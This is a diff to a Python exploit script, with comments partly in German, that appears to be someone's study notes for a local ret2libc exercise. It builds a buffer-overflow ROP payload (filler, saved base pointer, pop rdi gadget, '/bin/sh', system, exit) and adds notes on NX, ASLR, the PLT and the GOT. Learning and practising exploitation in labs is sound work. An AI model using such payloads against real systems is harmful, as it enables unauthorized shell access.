@@ -8,6 +8,8 @@
 #  # libc start: 0x7ffff7dd6000 (niedrigste der vorhandenen)
 # ls -l /lib/x86_64-linux-gnu/libc.so.6
 #  lrwxrwxrwx 1 root root 12 Feb 15 12:21 /lib/x86_64-linux-gnu/libc.so.6 -> libc-2.33.so
+# checksec
+#  NX bit set
 
 # p system
 # 0x7ffff7e1f860
@@ -44,9 +46,20 @@ buffer = 128 * b"a"  # 0x61
 backup_base_pointer = 8 * b"b"
 backup_instruction_pointer = system_call
 
-rop_pop_rsi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]
+rop_pop_rdi_ret = b"\x00\x00\x00\x00\x00\x40\x12\x03"[::-1]
 
-payload = buffer + backup_base_pointer + rop_pop_rsi_ret + bin_sh_string + system_call + exit_call
+# payload = buffer + backup_base_pointer + rop_pop_rsi_ret + bin_sh_string + system_call + exit_call
+
+rop_puts = b"\x00\x00\x00\x00\x00\x40\x10\x30"[::-1]
+
+payload = (
+    buffer
+    + backup_base_pointer
+    + rop_pop_rdi_ret
+    + bin_sh_string
+    + system_call
+    + exit_call
+)
 
 f = open("payload", "wb")
 f.write(payload)
@@ -70,3 +83,22 @@ f.write(payload)
 # echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
 # cat /proc/sys/kernel/randomize_va_space
 # repeat 5 ldd ./bin | head -n1
+# in gef: aslr on
+# aslr
+
+# https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got
+# gef: got
+#  run1: [0x403fc8] puts@GLIBC_2.2.5 -> 0x7f4e01ceae10
+#  run2: [0x403fc8] puts@GLIBC_2.2.5 -> 0x7ffff7e4be10
+# [static] -> dynamic
+# PLT (Procedure Linkage Table)
+#  x/a 0x403fc8 # puts@got.plt
+# GOT (Global Offset Table)
+
+# p system
+#  run1: 0x7fc0c4895860
+#  run2: 0x7ffff7e1f860
+
+# puts() is in the PLT, but system() is not!
+
+# 0x401030 (puts@plt) -> 0x403fc8 (puts@got.plt) -> 0x7f97af89be10 (puts)
